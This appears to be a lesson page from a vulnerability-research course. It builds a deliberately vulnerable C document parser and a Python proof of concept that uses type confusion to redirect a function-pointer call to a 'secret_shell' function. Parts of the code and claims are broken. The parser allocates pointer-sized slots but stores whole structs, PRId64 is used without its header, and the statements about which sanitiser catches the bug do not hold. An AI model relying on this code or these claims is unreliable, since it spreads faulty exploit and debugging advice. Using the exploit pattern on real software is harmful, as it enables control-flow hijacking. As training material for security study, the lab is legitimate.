---
title: "Type Confusion Lab — Exploit a Vulnerable C Parser"
tags: [vulnerability-research, type-confusion, lab, exploit, gdb, cwe-843,
  module-10-vulnresearch-01]
module: 10-VulnResearch-01
day: 672
prerequisites:
  - Day 671 — Bug Class: Type Confusion (CWE-843)
  - Day 395 — Heap Lab: UAF Exploit
related_topics:
  - Day 673 — Bug Class: OOB Read and Write (CWE-125/787)
  - Day 671 — Bug Class: Type Confusion (CWE-843)
---

# Day 672 — Type Confusion Lab

> "You read about type confusion yesterday. Today you cause it. The
> difference between knowing that the object is misread and watching
> it happen under GDB — seeing the vtable pointer used as an integer,
> watching the invalid function call blow up — that is the difference
> between a reader and a researcher. Lab today."
>
> — Ghost

---

## Goals

Trigger a type confusion vulnerability in a purpose-built C parser. Observe
the crash under ASan and GDB. Write a PoC that redirects control flow to a
target function. Document the exploit chain.

**Prerequisites:** Day 671.
**Estimated study time:** 4–5 hours.

---

## Lab Setup

### Vulnerable Target: `minidoc` Parser

Save the following as `minidoc.c` — a deliberately vulnerable document
parser that processes a binary format with a tagged value type system.

```c
/* minidoc.c — deliberately vulnerable mini-document parser
 * Bug: type tag is checked but the tag field can be modified through a
 * separately allocated reference before the data is read.
 * CWE-843: Access of Resource Using Incompatible Type (Type Confusion)
 *
 * Build:
 *   clang -g -fsanitize=address,undefined -o minidoc minidoc.c
 *   gcc   -g -o minidoc_nosec minidoc.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define MAX_FIELDS 64

typedef enum {
    TYPE_NULL    = 0,
    TYPE_INTEGER = 1,
    TYPE_STRING  = 2,
    TYPE_FUNCPTR = 3   /* internal type — should never appear in attacker data */
} FieldType;

typedef struct {
    FieldType  type;
    union {
        int64_t  as_int;
        char    *as_string;
        void   (*as_funcptr)(const char *);
    } data;
} Field;

typedef struct {
    uint32_t num_fields;
    Field   *fields;   /* array of Field, allocated separately */
} Document;

/* safe_print — legitimate handler for TYPE_STRING */
void safe_print(const char *s) {
    printf("[SAFE] %s\n", s);
}

/* secret_shell — should never be called from parsing */
void secret_shell(const char *cmd) {
    printf("[EXEC] Would run: %s\n", cmd);
    /* In a real exploit target: system(cmd) */
}

/* ── vulnerable parsing function ─────────────────────────────────── */

/*
 * parse_field reads a field from the input buffer.
 *
 * FORMAT:
 *   [1 byte type] [8 bytes data]
 *
 * VULNERABILITY:
 *   The 'type' field is stored in the Field struct on the heap.
 *   A subsequent call to update_field() (simulating an attacker who holds
 *   a reference) can change the 'type' byte before process_field() reads
 *   the data union — a TOCTOU type confusion.
 */
Field *parse_field(const uint8_t *buf, size_t buf_len) {
    if (buf_len < 9) return NULL;

    Field *f = calloc(1, sizeof(Field));
    if (!f) return NULL;

    f->type = (FieldType)buf[0];

    /* only accept TYPE_INTEGER and TYPE_STRING from external input */
    if (f->type != TYPE_INTEGER && f->type != TYPE_STRING) {
        free(f);
        return NULL;   /* reject TYPE_NULL and TYPE_FUNCPTR */
    }

    memcpy(&f->data.as_int, buf + 1, 8);   /* copy 8-byte data payload */
    return f;
}

/*
 * update_field — simulates a document mutation API.
 * BUG: allows the type byte to be changed without re-validating the data.
 */
void update_field_type(Field *f, uint8_t new_type) {
    f->type = (FieldType)new_type;   /* no validation! attacker can set TYPE_FUNCPTR */
}

/*
 * process_field — dispatches on the type field.
 * Called AFTER update_field_type, which may have changed the type.
 */
void process_field(const Field *f) {
    switch (f->type) {
    case TYPE_NULL:
        printf("[NULL field]\n");
        break;
    case TYPE_INTEGER:
        printf("[INT] %" PRId64 "\n", f->data.as_int);
        break;
    case TYPE_STRING:
        if (f->data.as_string) {
            printf("[STR] %s\n", f->data.as_string);
        }
        break;
    case TYPE_FUNCPTR:
        /* TYPE_FUNCPTR is an internal type used for callbacks.
         * Reaching here from attacker-controlled data is the bug. */
        if (f->data.as_funcptr) {
            f->data.as_funcptr("from_attacker");   /* ← TYPE CONFUSION SINK */
        }
        break;
    }
}

/* ── document parser ──────────────────────────────────────────────── */

Document *parse_document(const uint8_t *buf, size_t buf_len) {
    if (buf_len < 4) return NULL;

    Document *doc = calloc(1, sizeof(Document));
    if (!doc) return NULL;

    doc->num_fields = *(uint32_t *)buf;
    if (doc->num_fields > MAX_FIELDS) doc->num_fields = MAX_FIELDS;

    doc->fields = calloc(doc->num_fields, sizeof(Field *));
    if (!doc->fields) { free(doc); return NULL; }

    size_t offset = 4;
    for (uint32_t i = 0; i < doc->num_fields; i++) {
        if (offset + 9 > buf_len) break;
        Field *f = parse_field(buf + offset, buf_len - offset);
        if (f) doc->fields[i] = *f, free(f);
        offset += 9;
    }
    return doc;
}

/* ── main: simulate the TOCTOU window ────────────────────────────── */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <doc.bin>\n", argv[0]);
        return 1;
    }

    FILE *fp = fopen(argv[1], "rb");
    if (!fp) { perror("fopen"); return 1; }

    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    rewind(fp);

    uint8_t *buf = malloc(sz);
    if (!buf) { fclose(fp); return 1; }
    fread(buf, 1, sz, fp);
    fclose(fp);

    Document *doc = parse_document(buf, sz);
    if (!doc) { fprintf(stderr, "parse error\n"); free(buf); return 1; }

    printf("[*] Parsed %u fields\n", doc->num_fields);

    /* VULNERABILITY SIMULATION:
     * In a real application, a second code path (e.g., an HTTP handler)
     * could call update_field_type() on the same Field while the
     * document processing thread is about to call process_field().
     * For this lab, we simulate it directly.
     *
     * The 'update_type' byte in the document payload (at offset 4 + field_idx*9)
     * is used to trigger update_field_type() before process_field().
     * In the real bug: two threads, or a re-entrant callback.
     */
    for (uint32_t i = 0; i < doc->num_fields; i++) {
        Field *f = &doc->fields[i];

        /* Simulate attacker-controlled mutation via a "metadata" field
         * stored at a separate location in the buffer that update_field_type
         * reads. In a real parser, this could be a separate tag update
         * message from a protocol handler. */
        if (i + 1 < doc->num_fields) {
            uint8_t override_type = (uint8_t)doc->fields[i + 1].data.as_int;
            if (override_type != 0) {   /* if override is set, mutate field i */
                update_field_type(f, override_type);
            }
        }
        process_field(f);
    }

    free(buf);
    free(doc->fields);
    free(doc);
    return 0;
}
```

### Build Commands

```bash
# Save as samples/minidoc.c then:
mkdir -p samples
# (save minidoc.c to samples/minidoc.c)

# ASan build (for crash analysis)
clang -g -fsanitize=address,undefined \
      -fno-omit-frame-pointer \
      -o samples/minidoc samples/minidoc.c

# Non-instrumented build (for GDB without ASan noise)
clang -g -o samples/minidoc_raw samples/minidoc.c
```

---

## Exercise 1 — Understand the Vulnerability (30 minutes)

Read `minidoc.c` carefully. Answer the following before writing any exploit.

```
UNDERSTANDING EXERCISE

1. What is the type-confusion vulnerability?
   ___________________________________________________________
   ___________________________________________________________

2. What code path allows the 'type' field to be changed after parsing?
   Function: _________________________ Line: _________________

3. Which type tag causes the dangerous dispatch?
   Tag value: _______ — What operation does it trigger? ______

4. What is at offset 0 of the data union for TYPE_FUNCPTR?
   ___________________________________________________________

5. If the attacker sets data.as_int = 0xdeadbeef before the type is
   changed to TYPE_FUNCPTR, what happens in process_field()?
   ___________________________________________________________

6. What function would you redirect execution to? (Look at the source.)
   ___________________________________________________________
   Address (run: nm samples/minidoc | grep secret): ___________
```

---

## Exercise 2 — Craft the PoC (60 minutes)

```python
#!/usr/bin/env python3
"""
Day 672 — Type confusion PoC for minidoc parser.

The document format:
  [4 bytes: num_fields uint32_t LE]
  For each field:
    [1 byte: type (1=INT, 2=STRING)]
    [8 bytes: data]

STRATEGY:
  Field 0: TYPE_INTEGER, data = address of secret_shell()
           (this stores the function pointer in data.as_int)
  Field 1: TYPE_INTEGER, data = TYPE_FUNCPTR (= 3) in as_int
           (this is the 'override_type' that will be read as a byte
            and used to mutate field 0 via update_field_type())

When the parser loops:
  i=0: f = field 0 (type=TYPE_INTEGER, data=&secret_shell)
       override = field[1].data.as_int = 3 = TYPE_FUNCPTR
       update_field_type(f, 3) → f->type = TYPE_FUNCPTR
       process_field(f) → calls f->data.as_funcptr("from_attacker")
       f->data.as_funcptr = &secret_shell → secret_shell() is called
"""
from __future__ import annotations

import struct
import subprocess
import sys
from pathlib import Path


def get_secret_shell_address(binary: str) -> int:
    """Get the address of secret_shell via nm."""
    result = subprocess.run(
        ["nm", binary], capture_output=True, text=True
    )
    for line in result.stdout.splitlines():
        if "secret_shell" in line:
            addr_str = line.split()[0]
            return int(addr_str, 16)
    raise ValueError("secret_shell not found in symbol table")


def craft_poc(secret_shell_addr: int) -> bytes:
    """
    Craft a document that triggers the type confusion to call secret_shell.
    """
    poc = bytearray()

    # Header: 2 fields
    poc += struct.pack("<I", 2)

    # Field 0: TYPE_INTEGER (type=1), data = address of secret_shell
    # This will be mutated to TYPE_FUNCPTR before process_field() is called.
    poc += struct.pack("B", 1)                          # type = TYPE_INTEGER
    poc += struct.pack("<q", secret_shell_addr)          # data = &secret_shell

    # Field 1: TYPE_INTEGER (type=1), data.as_int = 3 = TYPE_FUNCPTR
    # This is the 'override_type' that triggers update_field_type(field0, 3).
    poc += struct.pack("B", 1)                          # type = TYPE_INTEGER
    poc += struct.pack("<q", 3)                          # data = TYPE_FUNCPTR value

    return bytes(poc)


if __name__ == "__main__":
    binary  = sys.argv[1] if len(sys.argv) > 1 else "./samples/minidoc_raw"
    outfile = sys.argv[2] if len(sys.argv) > 2 else "poc_type_confusion.bin"

    print(f"[*] Getting symbol addresses from {binary}...")
    secret_addr = get_secret_shell_address(binary)
    print(f"[*] secret_shell @ 0x{secret_addr:016x}")

    poc = craft_poc(secret_addr)
    Path(outfile).write_bytes(poc)
    print(f"[*] PoC written to {outfile} ({len(poc)} bytes)")
    print(f"[*] Run: {binary} {outfile}")
    print(f"[!] Expect: [EXEC] Would run: from_attacker")
```

```bash
# Run the PoC
python3 poc_type_confusion.py ./samples/minidoc_raw poc672.bin
./samples/minidoc_raw poc672.bin

# Expected output:
# [*] Parsed 2 fields
# [EXEC] Would run: from_attacker    ← TYPE CONFUSION TRIGGERED
```

---

## Exercise 3 — Observe Under ASan and GDB (60 minutes)

```bash
# 1. Run against the ASan build to see the sanitiser report
python3 poc_type_confusion.py ./samples/minidoc poc672.bin
./samples/minidoc poc672.bin 2>&1 | tee asan_output.txt

# Note: ASan will NOT catch this as a memory error because it is a logic bug
# (correct memory access, wrong type semantics). UBSan's -fsanitize=function
# would catch the function pointer type mismatch.

# Rebuild with -fsanitize=function to catch it:
clang -g -fsanitize=undefined,function -o samples/minidoc_ubsan samples/minidoc.c
./samples/minidoc_ubsan poc672.bin 2>&1 | head -20

# 2. Set a breakpoint on process_field in GDB to watch the confusion
gdb -q ./samples/minidoc_raw
# (gdb) break process_field
# (gdb) run poc672.bin
# ... hit breakpoint on first call (TYPE_INTEGER field 0) ...
# (gdb) print f->type              # shows TYPE_INTEGER (1)
# ... step through update_field_type call ...
# (gdb) print f->type              # now shows TYPE_FUNCPTR (3)!
# (gdb) print f->data.as_funcptr   # shows secret_shell address
# (gdb) continue                   # secret_shell() is called
```

### Observation Log

```
EXERCISE 3 LOG

UBSan output (key line):
  ___________________________________________________________

GDB — f->type before update_field_type:  ___________________
GDB — f->type after update_field_type:   ___________________
GDB — f->data.as_funcptr value:          0x_________________
GDB — secret_shell address (expected):   0x_________________
Match: Y / N

Did secret_shell() execute? Y / N
```

---

## Exercise 4 — Write the Vulnerability Summary (30 minutes)

```
TYPE CONFUSION FINDING SUMMARY

Target function: process_field()
Vulnerable code path: update_field_type() + process_field()
CWE: CWE-843
Root cause:
  ___________________________________________________________

Trigger sequence:
  1. ________________________________________________________
  2. ________________________________________________________
  3. ________________________________________________________

Attacker outcome: ___________________________________________

Fix (what change to the code would close this?):
  ___________________________________________________________
  ___________________________________________________________
  Location: _________________________________________________
```

---

## Key Takeaways

1. **Type confusion is a logic bug, not a memory error.** ASan will not
   catch it because the memory accesses are technically valid — the
   confusion is at the semantic level. UBSan's `-fsanitize=function`
   catches invalid function pointer casts. Know which sanitiser catches
   which class.
2. **The TOCTOU window is the attack surface.** In minidoc, the window
   between the type check in `parse_field()` and the data access in
   `process_field()` is the vulnerability. In real applications this
   window is a thread race, a re-entrant callback, or a mutation API
   like the document edit system here. The window is always there; the
   question is whether an attacker can fit into it.
3. **Function pointers in data unions are the highest-risk pattern.**
   Any union that contains both a function pointer member and an integer
   or string member is a potential type confusion site. If an attacker
   can write the integer member and cause the function pointer member to
   be dispatched, they have code execution.
4. **The fix is always a re-check.** By the time `process_field()` reads
   the type, it must not trust that the type is the same as when it was
   set. Either freeze the type (make it const after initial validation),
   re-validate in the dispatch function, or use a design that does not
   allow type mutation after construction.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q672.1, Q672.2 …).

---

## Navigation

← Previous: [Day 671 — Bug Class: Type Confusion (CWE-843)](DAY-0671-Bug-Class-Type-Confusion.md)
→ Next: [Day 673 — Bug Class: Out-of-Bounds Read and Write](DAY-0673-Bug-Class-OOB-Read-Write.md)
